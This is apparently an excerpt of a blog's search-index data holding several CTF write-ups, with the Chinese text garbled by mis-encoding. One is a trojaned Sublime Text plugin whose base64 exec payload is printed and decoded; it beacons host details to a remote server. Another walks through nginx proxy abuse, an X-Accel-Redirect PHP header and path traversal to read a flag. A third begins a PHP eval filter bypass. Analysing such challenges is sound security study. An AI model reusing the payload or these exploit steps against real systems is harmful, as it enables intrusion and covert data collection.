FF3F1FFF1FFF7C7EFCFFC7FF83FFFFFF0F9FF1FFFFFE11FC3F8FFF7F1FFF1FFF7C7EFC7FA7FF87FFFFFF0F9FE9FFFFFE31FC1F1FFE7F1FFF1FFF7E3EFE3E67FE3FFFFFFF1F8F99FFFFFF31FC403FE01F1FFF1FFF7E3EFF80E0FC7FFFFFFF1FC039FFFFFE71FC79FFFFFF1FFF1FFF7F1EFFF3EFF8FFFFFFFF1FF0F9FFFFFEF1FC7FFFFFFF1FFF1FFF7F0EFFFFFFF8FFFFFFFF1FFFF9FFFFFCF1FC7FFFFFFF1FFF1FFF7F8EFFFFFFF8FFFFFFFE1FFFF9FFFFF9F1FC7FFFFFFF1FFF1FFF7F86FFFFFFF8FF9F7FFE3FFFF9FFFFFBF1FC7FFFFFFF1FFF1FFF7FC6FFFFFFF8FF0F3FFE3FFFF9FFFFF7F1FC7FFFFFFF1FFF1FFF7FC2FFFFFFF8FF8FBFFC7FFFF9FFFFE7F1FC7FFFFFFF1FFF1FFF7FE2FFFFFFF8FF8F9FFC7FFFF9FFFFCFF1FC7FFFFFFF1FFF1FFF7FF0FFFFFFFCFF9F9FF8FFFFF9FFFF8FF1FC7FFFFFFF1FFF1FFF7FF0FFFFFFFC7F9F8FF1FFFFF9FFFF0FF0FC3FFFFFFF1FFF0FFE7FF8FFFFFFFE1E7F83E3FFFFF8FFFC03C03C0FFFFFFF03E000780FF83FFFFFFF80FFF80FFFFFF83FFFFFFFFDFFFFFFFF3FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;, 16))[2:] data2 = bin(int( &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE38FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFF7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF9FF3FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF9FF3FFFFFFFFFFFFF9FFEFBFFC7FFFFFFE1FFF8FFFFFFFC3FFFFFFFFFF9FF3FF8FFFFFFFFFF0FFEFBFF39FF007F9C7FE72FFFFFF3C3FC07FFFFF87E78463F803FF01F0FFE7BFEFEFFF7FF3F3F9F8FFFFFEFF3FFBFFFFFFC01FA3F9FFBFFFE7F9FFE71FCFE7FF7FF7F9F9FCFFFFFEFFBFFBFFFFFFFC07E7F9FFBFFFE7FFFFC71F9FF3FF7FEFF9F3FCFFFFFEFFBFFBFFFFFFFFE7E7F8FFBFFFE7FFFFD75F9FF3FF7FFFFCF3FCFFFFFE7FFFFBFFFFFFFFE7E7F9FFBFFFE7FFFFD35F9FF3FF7FFFFCF3FCFFFFFE3FFFFBFFFFFFF80FE7F9FFBFFFE7FFFFD2CF9FF3FF7FFFFCF3FCFFFFFF07FFFBFFFFFFF7CFE7F3FFBFFFE7FFFFB2CF9FF3FF7FE000F3FCFFFFFFC1FFFBFFFFFFE7E7E7C7FFBFFFE7FFFFBACF9FF3FF7FE7FCF3FCFFFFFFF87FFBFFFFFFE7E7E03FFFBFFFE7FFFFB9EF9FF3FF7FE7FCF3FCFFFFFFFE7FFBFFFFFFEFE7E7FFFFBFFFE7FFFFB9E79FF3FF7FE7F9F3FCFFFFFEFF3FFBFFFFFFEFE7E7F9FFBFFFE7FFFF79E7CFE7FF7FF3F9F9F8FFFFFEFF3FFBFFFFFFE7E7F7F1FFBFFFE7F1FF79E7EFCFFF7FF3F3F9F0FFFFFE7F7FFBFFFFFF27EFF3F3FFBFFFE7F0FE38E3F39FFF7FFCE7FC04FFFFFE1CFFF9FFFFFF019FF9E7FFBFFFE7F1FFFFFFFC7FFF7FFF1FFFBCFFFFFEE3FFF87FFFFFBE7FFE1FFFBFFE00FFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFFFE7FFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFFFE7FFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFFFE7FFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFE7E7FFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFF3FFFFFFFFFFFFFFFFBFE7EFFFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFF1FFFFFFFFFFFFFFFFBFE7CFFFFFFFFFFFFFFF03FFFFFFFC3FFFFFFFFFF1FFFFFFFFFFFFFFFF81F03FFFFFFFFFFFFFFF3FFFFFFFFCFFFFFFFFFFFBFFFFFFFFFFFFFFFF9FFFFFF&quot;, 16))[2:] step = 208 temp1 = [data1[i:i + step] for i in range(0, len(data1), step)] print(temp1) print(len(temp1)) for b in range(75, 75 + 26 * 8): for a in range(138, 138 + 48): if temp1[a - 138][b - 75] == &#x27;1&#x27;: img.putpixel((b, a), (255, 0, 0)) step = 232 temp2 = [data1[i:i + step] for i in range(0, len(data1), step)] for a in range(130, 130 + 32): for b in range(579, 579 + 29 * 8): if temp2[a - 130][b - 579] == &#x27;1&#x27;: img.putpixel((b, a), (255, 0, 0))drawbar()drawbarcode()img.show() åæ ‡ä½ç½®å¼„é”™äº†ï¼Œä¸è¿‡ä¸å½±å“è§£é¢˜ï¼Œdata1æ˜¯flagå¦ä¸€åŠï¼Œdata2ä¸å½±å“ã€‚ æœ¬é¢˜flagå…¨å°å†™å­—æ¯ã€‚ å¦é™„ä¸€ä»½TSPL/TSPL2çš„æ–‡æ¡£ã€‚ Worm in Apple ç»™äº†ä¸ªå‹ç¼©åŒ…ï¼Œdescription.mdçš„æç¤ºå†…å®¹ï¼š A guy I met on the Internet wanted me to test its new ST3 plugin. I have a bad feeling about this... Maybe you can tell me if I'm right to be worried? Investigate as far as you can. æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ä¸€ä¸ªSublime Text3ï¼ˆä¸‹é¢ç®€ç§°ST3ï¼‰çš„æ’ä»¶ã€‚ä¹‹å‰æ²¡ç©è¿‡ST3çš„æ’ä»¶å¼€å‘ï¼Œçœ‹æ–‡æ¡£ã€‚æ–‡æ¡£å†™çš„å¾ˆæ˜ç™½ï¼Œsublime-packageæ–‡ä»¶æ˜¯ä¸ªzipï¼ŒåŒ…å«pluginã€ä»£ç ç‰‡æ®µç­‰å†…å®¹ï¼Œè€ŒST3çš„æ’ä»¶å¼€å‘ç”¨çš„æ˜¯Pythonã€‚æˆ‘ä»¬æŠŠç»™çš„DoxyDoxygenè§£å‹åï¼Œå‘ç°Doxy.pyï¼Œæ‰“å¼€çœ‹çœ‹ï¼Œå‘ç°ç‰ˆæƒä¿¡æ¯__copyright__ = \"Copyright (c) 2015-2018 Sebastien Recio, all rights reserved\"ï¼Œé‚£ä¹ˆé¢˜ç›®æ‰€ç»™æ’ä»¶ä¸æ˜¯è‡ªå·±å†™çš„ï¼Œæ˜¯åŸç‰ˆæ”¹çš„ï¼Ÿå»Packagecontrol.ioä¸Šæœç„¶æœ‰ï¼Œé‚£ä¹ˆå°±å¯¹ç€package-metadata.jsonå†™çš„ç‰ˆæœ¬å·0.63.3ä¸‹ä¸€ä¸ªåŸç‰ˆã€‚Beyond Compareæ–‡ä»¶å¤¹å¯¹æ¯”ä¸€ä¸‹ï¼Œå‘ç°é¢˜ç›®ç»™çš„æ’ä»¶é‡ŒDoxy.pyå¤šäº†å‡ è¡Œï¼š 1234try: import base64;A=b&#x27;IyAgICAgICAvIVwgRk9SIEVEVUNBVElPTkFMIFBVUlBPU0UgT05MWSAvIVwKQT0nNy4yemJ2LWJuMDB5cmNwNHNjdi0zcnA1MnY0OWJ2LTNuY3MyJwpCPTQ0MwpDPScwMTIzNDU2Nzg5YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXotLicKaW1wb3J0IHRpbWU7aW1wb3J0IHJlcXVlc3RzO2ltcG9ydCBwbGF0Zm9ybTtmcm9tIHV1aWQgaW1wb3J0IHV1aWQ0O2Zyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKZGVmIHcoKToKICAgIGksdT1zdHIodXVpZDQoKSksJ2h0dHBzOi8ve306e30ve30nLmZvcm1hdCgnJy5qb2luKFtDWyhDLmluZGV4KGUpLTB4MGQpJWxlbihDKV0gZm9yIGUgaW4gQV0pLEIsJycuam9pbihbY2hyKGVeMHg0MikgZm9yIGUgaW4gWzQ0LDQ1LDU0LDQzLDM2LDU5XV0pKQogICAgd2hpbGUgVHJ1ZTpyZXF1ZXN0cy5wb3N0KHUsanNvbj17J3V1aWQnOmksJ25vZGUnOnBsYXRmb3JtLm5vZGUoKSwncGxhdGZvcm0nOnBsYXRmb3JtLnBsYXRmb3JtKCl9KTt0aW1lLnNsZWVwKDUpCnQ9VGhyZWFkKHRhcmdldD13KQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOnQuc3RhcnQoKTt0LmpvaW4oKQplbHNlOnQuZGFlbW9uPVRydWU7dC5zdGFydCgpCg==&#x27;;exec(base64.b64decode(A));except: pass Base64è§£å®Œæ•´ç†ä¸€ä¸‹ï¼š 1234567891011121314# /!\\\\ FOR EDUCATIONAL PURPOSE ONLY /!\\\\A=&#x27;7.2zbv-bn00yrcp4scv-3rp52v49bv-3ncs2&#x27;B=443C=&#x27;0123456789abcdefghijklmnopqrstuvwxyz-.&#x27;import time;import requests;import platform;from uuid import uuid4;from threading import Threaddef w(): i,u=str(uuid4()),&#x27;https://&#123;&#125;:&#123;&#125;/&#123;&#125;&#x27;.format(&#x27;&#x27;.join([C[(C.index(e)-0x0d)%len(C)] for e in A]),B,&#x27;&#x27;.join([chr(e^0x42) for e in [44,45,54,43,36,59]])) while True: requests.post(u,json=&#123;&#x27;uuid&#x27;:i,&#x27;node&#x27;:platform.node(),&#x27;platform&#x27;:platform.platform()&#125;);time.sleep(5)t=Thread(target=w)if __name__ == &#x27;__main__&#x27;: t.start();t.join()else: t.daemon=True;t.start() ç¨å¾®è°ƒä¸€ä¸‹å‘ç°å®ƒä¼šæ¯5så‘https://worm-in-apple.ctf.insecurity-insa.fr:443/notifyè¿™ä¸ªåœ°å€POSTæ–¹å¼æäº¤ä¸€ä¸ªuuid4()ã€‚ BUUOJä¸Šæ²¡Webç«¯ï¼Œæš‚æ—¶æ²¡æ³•åšäº†ã€‚ã€‚ She æ˜¯ä¸ªæ¸¸æˆï¼Œçœ‹Dataç›®å½•ä¸€å †rxdataæ–‡ä»¶ï¼Œæœä¸€ä¸‹å‘ç°æ˜¯RPG Maker XPåˆ¶ä½œçš„ï¼Œä¸‹è½½åæ–°å»ºå·¥ç¨‹ï¼Œä¿å­˜åæŠŠå·¥ç¨‹æ–‡ä»¶æ”¾åˆ°ç»™çš„Sheç›®å½•ä¸‹å³å¯ç¼–è¾‘å½“å‰æ¸¸æˆäº†ã€‚ ä»¥é˜²ä¸‡ä¸€ï¼Œå…ˆè°ƒå‡ºæ•°æ®åº“ï¼ŒæŠŠä¸»è§’çš„æ­¦å™¨ä¼¤å®³æ‹‰æ»¡ï¼ŒæŠŠæ•Œäººçš„è¡€é‡ã€æ”»å‡»ã€é˜²å¾¡æ‹‰åˆ°æœ€ä½ã€‚ç„¶åè¿›å…¥å·¦ä¸‹è§’é‚£ä¸ªæˆ¿é—´å¹²æ‰Bossï¼Œä¼šå¼€å¯ä¸€ä¸ªé—¨ã€‚è¿›äº†é—¨æ¥åˆ°ä¸€ä¸ªåœ°ç‰¢ï¼ˆï¼Ÿï¼‰ï¼Œæç¤ºæˆ‘ä»¬ä¸èƒ½ç¢°åˆ°å¸è¡€é¬¼ï¼Œé‚£å°±åœ¨åœ°å›¾ç¼–è¾‘å™¨é‡ŒæŠŠROOM1-3çš„å¸è¡€é¬¼åˆ æ‰ã€‚çœ‹ROOM4çš„å‡ ä¸ªäº‹ä»¶ï¼Œæç¤ºMagic Mirror:Combine those numbers you found in the chest and submit it with MD5 encrypt!ã€‚å°±æ˜¯è®©æˆ‘ä»¬å»æ‰¾å¼€é—¨çš„é¡ºåºã€‚ç„¶åå°±å‘ç°ROOM2çš„å·¦è¾¹å’Œå³è¾¹çš„é—¨æ²¡æ³•å¼€ï¼Œå·¦è¾¹çš„é—¨å› ä¸ºæ²¡æœ‰å½±å“0039:14å˜é‡çš„æ¡ä»¶æ— æ³•å¼€ï¼Œå³è¾¹çš„é—¨å‹æ ¹å°±æ²¡æœ‰è®¾è®¡å¼€çš„é€‰é¡¹ã€‚ROOM3å³è¾¹çš„é—¨åŒæ ·ï¼Œæ²¡æœ‰å½±å“0029:4çš„å˜é‡ï¼Œä¹Ÿæ²¡æ³•å¼€ã€‚é‚£ä¹ˆå‰©ä¸‹çš„é—¨æ€»å¯ä»¥å¼€å¯ï¼Œå¯¹åº”çš„æ•°å­—æŒ‰ç…§é—¨ä»å·¦å‘å³æ’åˆ—çš„é¡ºåºå¯¹åº”ä¸º213697ã€‚ç„¶åè®©æˆ‘ä»¬ç®—MD5ï¼Œè¯•äº†åŠå¤©å‘ç°å°±æ˜¯è¿™ä¸ªé¡ºåºã€‚ï¼ˆyysyï¼Œæ²¡çœ‹åˆ°Bad Dooré€ æˆçš„å½±å“ã€‚ï¼‰ flag{eeb61c77-b3b4-4bdc-a119-ce65a2950e3a}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/tags/Misc/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Stego","slug":"Stego","permalink":"http://tiaonmmn.github.io/tags/Stego/"},{"name":"USB","slug":"USB","permalink":"http://tiaonmmn.github.io/tags/USB/"},{"name":"æ‰“å°æœº","slug":"æ‰“å°æœº","permalink":"http://tiaonmmn.github.io/tags/%E6%89%93%E5%8D%B0%E6%9C%BA/"}]},{"title":"MyHexo","slug":"MyHexo","date":"2019-08-22T09:38:37.000Z","updated":"2020-09-01T13:34:47.679Z","comments":true,"path":"2019/08/22/MyHexo/","link":"","permalink":"http://tiaonmmn.github.io/2019/08/22/MyHexo/","excerpt":"","text":"è®°å½•ä¸€ä¸‹ç”¨Hexoä»¥æ¥è¸©è¿‡çš„å‘ã€‚ æ’ä»¶ ç”¨åˆ°çš„æ’ä»¶æœ‰ï¼š hexo-tag-aplayer hexo-word-count hexo-blog-encryptï¼ˆé…ç½®äº†åŠ å¯†çš„åšæ–‡å’Œaplayerå†²çªï¼‰ hexo-related-popular-posts hexo-generator-json-contentï¼ˆicarusä¸»é¢˜çš„insightæœç´¢ï¼‰ hexo-filter-mathjax hexo-renderer-pandoc hexo-generator-searchdb theme-next/theme-next-calendarï¼ˆæ—¥å†ï¼‰ theme-next/hexo-next-shareï¼ˆåˆ†äº«æŒ‰é’®ï¼‰ theme-next/hexo-next-titleï¼ˆçª—å£å¤±å»ç„¦ç‚¹åæ¢æ ‡é¢˜ï¼‰ theme-next/hexo-next-coauthorï¼ˆå‰¯ä½œè€…ï¼‰ theme-next/hexo-filter-emojiï¼ˆGithubè¡¨æƒ…ï¼‰ Next æˆ‘æ¯”è¾ƒå–œæ¬¢å¤§è€Œå…¨çš„ä¸»é¢˜ï¼Œæ‰€ä»¥ç”¨çš„Nextã€‚ç„¶åï¼Œæ²¡äº‹ä¸è¦è½»æ˜“å‡çº§nextã€‚è¦å‡ä¹Ÿæ˜¯å¤§ç‰ˆæœ¬å‡çº§ã€‚nextçš„githubé‚£é‡ŒåŸºæœ¬ä¸Šæ²¡æœ‰è®¤çœŸéªŒè¯èƒ½å¦è·‘é€šçš„ã€‚ å»¶è¿Ÿ githubå’Œtencentçš„å¹³å°æœ‰å»¶è¿Ÿï¼ŒåŸºæœ¬ä¸Šè¦ç­‰5åˆ†é’Ÿå·¦å³å†å»è®¿é—®ã€‚ &amp; &lt; &gt; Hexoåšæ–‡çš„æ ‡é¢˜ä¸èƒ½å‡ºç°â€œ&amp;â€ã€â€œ&lt;â€ã€â€œ&gt;â€è¿™äº›å­—ç¬¦ã€‚å¦åˆ™local-searchä¼šæ²¡æ³•ç”¨ã€‚ flag{9e047d10-c4c0-11e9-a2e4-1914e95dcfd8}","categories":[{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/categories/Misc/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"http://tiaonmmn.github.io/tags/Hexo/"}]},{"title":"Midnightsun-Bigspin","slug":"Midnightsun-Bigspin","date":"2019-08-20T08:23:15.000Z","updated":"2019-12-10T12:15:12.668Z","comments":true,"path":"2019/08/20/Midnightsun-Bigspin/","link":"","permalink":"http://tiaonmmn.github.io/2019/08/20/Midnightsun-Bigspin/","excerpt":"æ”¾å‡å„ç§æ‘¸é±¼ï¼Œä»Šå¤©æ¥ä¸ªä¸ä¸€æ ·çš„Webé¢˜ã€‚Midnightsun 2019 Quals CTFçš„Bigspinã€‚ Part 1.ä»£ç†","text":"æ”¾å‡å„ç§æ‘¸é±¼ï¼Œä»Šå¤©æ¥ä¸ªä¸ä¸€æ ·çš„Webé¢˜ã€‚Midnightsun 2019 Quals CTFçš„Bigspinã€‚ Part 1.ä»£ç† æ‰“å¼€é¡µé¢åå¾ˆç›´æ¥ï¼Œç»™äº†å››ä¸ªé“¾æ¥ï¼šuberadminã€adminã€userå’Œplebï¼Œç‚¹è¿›å»å‘ç°uberadmin 403ã€admin 404ã€user 403ã€plebå¯¹åº”ä¸€ä¸ªExample Domainçš„é¡µé¢ï¼ˆåæ¥å‘ç°æ˜¯ä¸€ä¸ªå«åšhttps://www.example.comçš„ç½‘ç«™ï¼‰ã€‚å¼€å§‹ä»¥ä¸ºä¼šæ˜¯ä»plebä¸‹æ‰‹ï¼Œç„¶åå‘ç°å„ç§é“¾æ¥è¿”å›åŒæ ·çš„å†…å®¹ã€‚ çœ‹ä¸€ä¸‹HTTPå“åº”å¤´ï¼ŒWebæœåŠ¡å™¨ä¸ºNginxï¼Œå¯èƒ½ä¼šå‡ºç°è·¯å¾„ç©¿è¶Šé—®é¢˜ã€‚è®¿é—®http://xxx.xxx.xxx.xxx/pleb../ï¼Œå‘ç°è¿”å›äº†ä¸ª502 Bad Gatewayï¼Ÿè¿™å°±æœ‰æ„æ€äº†ã€‚æ­£å¸¸æƒ…å†µä¸‹çš„è·¯å¾„ç©¿è¶Šåªä¼šè¿”å›200æˆ–è€…404ï¼Œ502æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼ŸGoogleåˆ°è¿™ä¸ªä¸œè¥¿ï¼Œä¸Šé¢æåˆ°ä¸‰æ¡åŸå› ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªDomain name not resolvableæœ‰ç‚¹æ„æ€ï¼Œè¿™è®©æˆ‘ä»¬çŒœæµ‹/pleb/ä¸‹æœ‰ä¸€ä¸ªä»£ç†ã€‚/pleb../è¿”å›502çš„åŸå› çŒœæµ‹ä¸ºæ²¡æœ‰www.example.com../è¿™ä¸ªåŸŸåï¼Œå› ä¸ºå®ƒç¡®å®ä¸åˆæ³•ã€‚ é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨çš„æƒ³æ³•æ˜¯ï¼šé€šè¿‡æŸç§æ–¹å¼ï¼Œå°†ä»£ç†æŒ‡å‘é¢˜ç›®æœåŠ¡å™¨ï¼ˆ127.0.0.1ï¼‰ï¼Œè®¿é—®ã€‚ ç„¶åå°±åˆ°é‡ç‚¹äº†ï¼Œç¡®å®æœ‰è¿™ç§ç½‘ç«™ï¼Œèƒ½å°†ä»»æ„DNSåŸŸåè½¬ä¸ºIPåŸŸåï¼šhttps://nip.ioã€‚æˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹ï¼šè®¿é—®http://xxx.xxx.xxx.xxx/pleb-yyy.yyy.yyy.yyy.nip.io/ é‚£ä¹ˆæˆ‘ä»¬è¯•ä¸€ä¸‹æœ€å¼€å§‹æ— æ³•æ‰“å¼€çš„uberadminç­‰è·¯å¾„ï¼š Part 2.Nginxé…ç½® userç›®å½•ä¸‹æœ‰ä¸€ä¸ªnginx.cÃ¶nfæ–‡ä»¶ï¼Œæˆ‘ä»¬æ²¡åŠæ³•ç›´æ¥æ‰“å¼€ã€‚Nginxå¯¹äºUnicodeå­—ç¬¦æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸¤æ¬¡URLç¼–ç æ‰“å¼€æ–‡ä»¶ã€‚å³è®¿é—®http://127.0.0.1:5631/pleb.127.0.0.1.nip.io/user/nginx.c%25c3%25b6nfï¼Œå¯ä»¥å¾—åˆ°nginxçš„é…ç½®æ–‡ä»¶ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738events &#123; worker_connections 1024;&#125;http &#123; resolver 8.8.8.8 ipv6=off; server &#123; listen 80; location / &#123; root /var/www/html/public; try_files $uri $uri/index.html $uri/ =404; &#125; location /user &#123; allow 127.0.0.1; deny all; autoindex on; root /var/www/html; &#125; location /admin &#123; internal; autoindex on; alias /var/www/html/admin/; &#125; location /uberadmin &#123; allow 13.3.7.233; deny all; autoindex on; alias /var/www/html/uberadmin; &#125; location ~ /pleb([/a-zA-Z0-9.:%]+) &#123; proxy_pass http://example.com$1; &#125; &#125;&#125; uberadminåªå…è®¸IPä¸º13.3.7.233è®¿é—®ï¼Œæš‚æ—¶æ²¡æ³•ç»•è¿‡ã€‚è€Œadminæœ‰ä¸ªå¾ˆæœ‰è¶£çš„internalé€‰é¡¹ã€‚æ‰¾åˆ°æ–‡æ¡£ï¼Œå…¶ä¸­ä¸€æ¡ç‰¹åˆ«æœ‰æ„æ€ï¼šrequests redirected by the â€œX-Accel-Redirectâ€ response header field from an upstream server;å°±æ˜¯è¯´å¦‚æœè¿œç¨‹æœåŠ¡å™¨å‘é€äº†X-Accel-Redirectå¤´ï¼Œnginxä¼šå°†å…¶è®¤ä¸ºæ˜¯internalè®¿é—®è¿›è¡Œè·³è½¬ã€‚ é‚£ä¹ˆæ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼šè¿œç¨‹æœåŠ¡å™¨å‘é€HTTPå¤´è¯·æ±‚ï¼Œé¢˜ç›®æ¥å—å¹¶è·³è½¬å³å¯ã€‚PHPå°±å¯ä»¥äº†ã€‚ 1234567&lt;?phpheader(&quot;X-Accel-Redirect: /admin/&quot;);?&gt; æ”¾åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šï¼Œç„¶ååœ¨é¢˜ç›®ç«¯è®¿é—®å°±å¯ä»¥åˆ—adminç›®å½•å†…å®¹äº†ã€‚ ä½†æ˜¯æˆ‘ä»¬æ²¡æ³•ç›´æ¥æ‰“å¼€ï¼Œéœ€è¦ä¿®æ”¹æœåŠ¡å™¨çš„PHPæ–‡ä»¶æ‰èƒ½è®¿é—®ã€‚ç„¶åæˆ‘ä»¬å¾—åˆ°äº†ä¸ªå‡flagæç¤ºuberadminä¸‹æœ‰çœŸæ­£çš„flagã€‚ uberadminä»…å…è®¸ç‰¹å®šIPè®¿é—®ï¼Œæ²¡æ³•ç›´æ¥è®¿é—®åˆ°ï¼Œä½†æ˜¯æ³¨æ„çœ‹nginxæ–‡ä»¶çš„å†™æ³•ï¼š/adminï¼Œè€Œä¸æ˜¯/admin/ï¼Œå­˜åœ¨è·¯å¾„ç©¿è¶Šã€‚å› æ­¤æ”¹è·¯å¾„æˆ/admin../uberadmin/flag.txtå³å¯æ‹¿åˆ°çœŸæ­£çš„flagã€‚ flag{e92273c1-52fc-47c5-a6f4-10a1b6577ce7}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Nginx","slug":"Nginx","permalink":"http://tiaonmmn.github.io/tags/Nginx/"},{"name":"nip.io","slug":"nip-io","permalink":"http://tiaonmmn.github.io/tags/nip-io/"}]},{"title":"ISITDTU-Easy PHP","slug":"ISITDTU-Easy-PHP","date":"2019-07-18T13:34:22.000Z","updated":"2019-12-10T12:15:12.666Z","comments":true,"path":"2019/07/18/ISITDTU-Easy-PHP/","link":"","permalink":"http://tiaonmmn.github.io/2019/07/18/ISITDTU-Easy-PHP/","excerpt":"æœ¬æ¥éƒ½å¼ƒå‘Webäº†ï¼Œç„¶åå‘ç°è‡ªå·±è¿˜åœ¨CTFTrainingé¡¹ç›®é‡Œï¼Œæ”¾å‡å¿«ä¸€ä¸ªæœˆå¤©å¤©å’¸é±¼ï¼Œç¨å¾®åšç‚¹å·¥ä½œå§ã€‚ ISITDTU CTF 2019çš„Easy PHPï¼Œé¢˜ç›®æè¿°ï¼šDon't try to run any Linux command, just use all the PHP functions you know to get the flagã€‚è¨€ç®€æ„èµ…ã€‚","text":"æœ¬æ¥éƒ½å¼ƒå‘Webäº†ï¼Œç„¶åå‘ç°è‡ªå·±è¿˜åœ¨CTFTrainingé¡¹ç›®é‡Œï¼Œæ”¾å‡å¿«ä¸€ä¸ªæœˆå¤©å¤©å’¸é±¼ï¼Œç¨å¾®åšç‚¹å·¥ä½œå§ã€‚ ISITDTU CTF 2019çš„Easy PHPï¼Œé¢˜ç›®æè¿°ï¼šDon't try to run any Linux command, just use all the PHP functions you know to get the flagã€‚è¨€ç®€æ„èµ…ã€‚ 123456789101112&lt;?phphighlight_file(__FILE__);$_ = @$_GET[&#x27;_&#x27;];if ( preg_match(&#x27;/[\\x00- 0-9\\&#x27;&quot;`$&amp;.,|[&#123;_defgops\\x7F]+/i&#x27;, $_) ) die(&#x27;rosÃ© will not do it&#x27;);if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd ) die(&#x27;you are so close, omg&#x27;);eval($_);?&gt; æ ¸å¿ƒå°±æ˜¯ç»•é‚£ä¸¤ä¸ªifã€‚ç¬¬ä¸€ä¸ªæ­£åˆ™æœ‰ç‚¹å¤æ‚ï¼Œè¿™é‡Œæ¨èä¸ªç½‘ç«™ï¼Œæ–¹ä¾¿è°ƒè¯•æ­£åˆ™ã€‚æ€»è€Œè¨€ä¹‹ï¼Œé‚£ä¸ªæ­£åˆ™çš„æ„æ€æ˜¯åŒ¹é…00åˆ°ç©ºæ ¼()çš„å­—ç¬¦ï¼Œ0åˆ°9çš„æ•°å­—ã€\"$&amp;.,|[&#123;_defgopsä»¥åŠDELï¼ˆ7fï¼‰å­—ç¬¦ã€‚å¦‚æœä½ æäº¤çš„å­—ç¬¦ä¸²å‡ºç°ä¸Šè¿°å­—ç¬¦ï¼Œdieã€‚ç¬¬äºŒä¸ªifè¡¨ç¤ºæˆ‘ä»¬æäº¤çš„å­—ç¬¦ä¸²ä¸€å…±ä¸èƒ½å‡ºç°å¤šäº13ç§ä¸åŒçš„å­—ç¬¦ã€‚æ¢è¨€ä¹‹ï¼Œå…è®¸å‡ºç°çš„å­—ç¬¦å¦‚ä¸‹ï¼š!#%()*+-/:;&lt;=&gt;?@ABCHIJKLMNQRTUVWXYZ\\]^abchijklmnqrtuvwxyz&#125;~ã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹PHPå†…ç½®å‡½æ•°ç¬¦åˆä¸Šè¿°æ¡ä»¶çš„æœ‰å“ªäº›ã€‚ 12345678&lt;?php$array=get_defined_functions();foreach($array[&#x27;internal&#x27;] as $arr)&#123; if ( preg_match(&#x27;/[\\x00- 0-9\\&#x27;&quot;\\`$&amp;.,|[&#123;_defgops\\x7F]+/i&#x27;, $arr) ) continue; if ( strlen(count_chars(strtolower($arr), 0x3)) &gt; 0xd ) continue; print($arr.&#x27;&lt;br/&gt;&#x27;);&#125;?&gt; ç„¶åæˆ‘ä»¬å¾—åˆ°å¦‚ä¸‹åˆ—è¡¨ï¼š bcmul ltrim rtrim trim chr link unlink tan atan atanh tanh intval mail min max 